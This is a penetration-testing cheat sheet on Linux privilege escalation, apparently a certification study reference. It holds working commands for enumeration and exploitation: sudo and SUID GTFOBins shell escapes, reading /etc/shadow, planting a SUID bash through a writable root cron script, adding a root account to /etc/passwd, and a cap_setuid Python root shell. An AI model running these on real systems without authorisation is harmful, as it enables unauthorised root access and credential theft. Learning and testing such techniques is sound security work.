---
tool: Linux privilege escalation
slug: linux-privesc
kind: technique
stages: [post-compromise]
targets: [linux]
category: Local root on Linux
platforms: [linux]
services: []
ports: []
tags: [privilege-escalation, sudo, suid, cron, capabilities, gtfobins]
attack: [T1548.001, T1068, T1053.003]
summary: The checks that turn a user shell into root: sudo rights, SUID binaries, cron jobs, capabilities, writable files and PATH. Run the enumeration, then exploit the one good finding.
references:
  - GTFOBins | https://gtfobins.github.io/
  - HackTricks Linux privesc | https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
---

## Enumerate

```bash
id; sudo -l                               # what can I run as root?
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
getcap -r / 2>/dev/null                   # file capabilities
cat /etc/crontab; ls -la /etc/cron.*      # scheduled jobs
ls -la /etc/passwd /etc/shadow            # writable?
uname -a; cat /etc/os-release             # kernel / distro for known exploits
```

Or run [linPEAS](/cpts/#tool-peass) and read the red findings first.

## Common wins

```bash
# sudo entry with a GTFOBins escape
sudo -l            # e.g. (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit
# SUID GTFOBins binary
/usr/bin/base64 /etc/shadow | base64 -d   # read as root via a SUID base64
# Writable cron script that runs as root
echo 'cp /bin/bash /tmp/rb; chmod 4777 /tmp/rb' >> /path/writable.sh
# PATH hijack: a script calls a binary by name, and you control an earlier PATH dir
# Writable /etc/passwd: add a root user with a known password
openssl passwd -1 -salt x pass            # -> put root:$1$...:0:0:/root:/bin/bash
```

## SUID/SGID and capabilities, in depth

The SUID bit runs a binary as its owner (often root); SGID does the same for the group. Enumerate both, plus file capabilities, and the custom or unusual ones are the promising leads, not the distro defaults (`passwd`, `ping`, `sudo`).

```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null   # SUID, with detail
find / -perm -2000 -type f -exec ls -la {} \; 2>/dev/null   # SGID
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null         # both in one sweep
getcap -r / 2>/dev/null                                     # file capabilities
```

Look each binary up on GTFOBins for the SUID escape, and keep the `-p` flag so the shell holds the elevated UID:

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit        # SUID find -> root shell (-p!)
./suidbash -p                                     # SUID bash
cp --no-preserve=mode ... # write primitive via SUID cp
```

Capabilities are root's powers split into units a binary can hold without full SUID. `cap_setuid+ep` on an interpreter is instant root; `cap_dac_read_search+ep` reads any file (e.g. `/etc/shadow`); `cap_dac_override+ep` writes any file.

```bash
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'   # cap_setuid+ep
```

GTFOBins has the full capability, SUID and sudo reference tables.

## Notes

Always check [GTFOBins](https://gtfobins.github.io/) for a sudo or SUID binary you find: it lists the exact escape. Prefer a config win (sudo, cron, SUID, capability) over a kernel exploit, which can crash the box. Confirm you are root (`id`) and note the exact path for the report.
